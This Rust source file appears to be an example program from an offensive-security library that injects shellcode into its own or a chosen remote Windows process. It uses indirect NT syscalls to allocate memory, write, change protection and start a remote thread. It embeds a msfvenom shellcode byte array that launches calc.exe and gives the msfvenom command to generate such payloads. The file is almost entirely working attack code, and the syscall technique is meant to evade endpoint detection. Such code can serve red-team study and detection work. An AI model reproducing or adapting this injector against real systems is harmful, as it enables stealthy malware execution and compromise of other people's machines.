use std::ffi::c_void;
use std::os::windows::raw::HANDLE;
use std::ptr::null;

use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
use winapi::um::winnt::{GENERIC_EXECUTE, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_ALL_ACCESS};

use thermite::{debug, info};
use thermite::indirect_syscall as syscall;


#[repr(C)]
#[derive(Debug, Clone)]
pub struct ClientId {
	pub unique_process: HANDLE,
	pub unique_thread: HANDLE,
}



/// A basic msfvenom shellcode, just spawns calc.exe
///
/// Go get your own shellcode, you don't know where this one has been,
/// You can generate the same using the following command:
/// ```bash
/// msfvenom -p windows/x64/exec CMD=calc.exe -f rust -v SHELLCODE
/// ```
const POP_CALC: [u8; 276] = [
	0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
	0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
	0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
	0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
	0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
	0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
	0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
	0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
	0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
	0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
	0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
	0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
	0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
	0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
	0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
	0x65, 0x78, 0x65, 0x00,
];


/// Read the PID from the program's command line arguments, if a valid PID is read, returns Some(PID)
/// If nothing is found or if the argument cannot be parsed, returns None
fn read_pid() -> Option<u32> {
	let args: Vec<String> = std::env::args().collect::<Vec<String>>();
	if args.len() > 1 {
		let pid: u32 = args[1].parse().ok()?;
		debug!("Target process ID :", pid);
		Some(pid)
	} else {
		None
	}
}


///
/// The function below demonstrate how to execute a shellcode
/// either locally, in our own processes memory or by
/// injecting it in a remote process.
///
/// It takes a PID as argument, if the pid is 0, the shellcode will be executed locally
/// If a PID is provided, it will be injected in the target process
///
fn injector(pid: Option<u32>) {
	// Declaring structures we're going to need
	let mut thread_handle: isize = 0;
	let oa_process = OBJECT_ATTRIBUTES {
		Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as _,
		RootDirectory: 0u32 as _,
		ObjectName: 0u32 as _,
		Attributes: 0,
		SecurityDescriptor: 0u32 as _,
		SecurityQualityOfService: 0u32 as _,
	};

	// This is "pseudo handle", a sort of handle constant
	// The value -1 means it's a handle to our own process
	let mut process_handle: isize = -1;

	// If we have a target PID,
	// we go get a real handle to the target process
	// Else we'll  just continue with the pseudo handle
	if let Some(pid) = pid {
		let client_id = ClientId {
			unique_process: pid as _,
			unique_thread: 0 as _,
		};
		syscall!("NtOpenProcess",
            &mut process_handle, //  [out]          PHANDLE            ProcessHandle,
            PROCESS_ALL_ACCESS,  //  [in]           ACCESS_MASK        DesiredAccess,
            &oa_process,         //  [in]           POBJECT_ATTRIBUTES ObjectAttributes,
            &client_id);         //  [in, optional] PCLIENT_ID         client_id

	}
	let mut buf_size: usize = POP_CALC.len();
	let mut base_addr: *mut c_void = 0u32 as _;

	syscall!("NtAllocateVirtualMemory",
        process_handle,           // [in]      HANDLE    ProcessHandle,
        &mut base_addr,           // [in, out] PVOID     *BaseAddress,
        0u32,                     // [in]      PULONG ZeroBits,
        &mut buf_size,            // [in, out] PSIZE_T   RegionSize,
        MEM_COMMIT | MEM_RESERVE, // [in]      ULONG     AllocationType,
        PAGE_READWRITE);          // [in]      ULONG     Protect
	
	info!("Allocated {} bytes of memory at address {:#x?}", buf_size, base_addr);

	// Copy the shellcode to newly allocated memory
	let mut bytes_written: usize = 0;
	syscall!("NtWriteVirtualMemory",
        process_handle,     // [in]            HANDLE ProcessHandle,
        base_addr,          // [in]            PVOID  *BaseAddress,
        &POP_CALC,          // [in]            PVOID  buffer,
        buf_size,           // [in]            ULONG  NumberOfBytesToWrite,
        &mut bytes_written);// [out, optional] PULONG NumberOfBytesWritten ,

	info!("Successfully written {} bytes in target process' memory", buf_size);

	// Change protection status of allocated memory to READ+EXECUTE
	let mut bytes_written = POP_CALC.len();
	let mut old_protec = PAGE_READWRITE;
	syscall!("NtProtectVirtualMemory",
        process_handle,     // [in]      HANDLE ProcessHandle,
        &mut base_addr,     // [in, out] PVOID  *BaseAddress,
        &mut bytes_written, // [in, out] PULONG NumberOfBytesToProtect,
        PAGE_EXECUTE_READ,  // [in]      ULONG  NewAccessProtection,
        &mut old_protec);   // [out]     PULONG OldAccessProtection,

	// Creates a remote thread in target process
	syscall!("NtCreateThreadEx",
        &mut thread_handle,    // [out]          PHANDLE ThreadHandle,
        GENERIC_EXECUTE,       // [in]           ACCESS_MASK DesiredAccess,
        null::<*mut c_void>(), // [in, optional] POBJECT_ATTRIBUTES ObjectAttributes,
        process_handle,        // [in]           HANDLE ProcessHandle,
        base_addr,             // [in, optional] PVOID StartRoutine,
        base_addr,             // [in, optional] PVOID Argument,
        0i32,                  // [in]           ULONG CreateFlags,
        null::<*mut c_void>(), // [in, optional] ULONG_PTR ZeroBits,
        null::<*mut c_void>(), // [in, optional] SIZE_T StackSize,
        null::<*mut c_void>(), // [in, optional] SIZE_T MaximumStackSize,
        null::<*mut c_void>());// [in, optional] PVOID AttributeList

	// Wait for the thread to execute
	// Timeout is a null pointer, so we wait indefinitely
	syscall!("NtWaitForSingleObject",
        thread_handle,          //  [in] HANDLE         handle,
        0,                      //  [in] BOOLEAN        Alertable,
        null::<*mut c_void>()); //  [in] PLARGE_INTEGER Timeout

	// Close the handle
	syscall!("NtClose",
        thread_handle); // [in] HANDLE handle
}


fn main() {
	injector(read_pid());
}
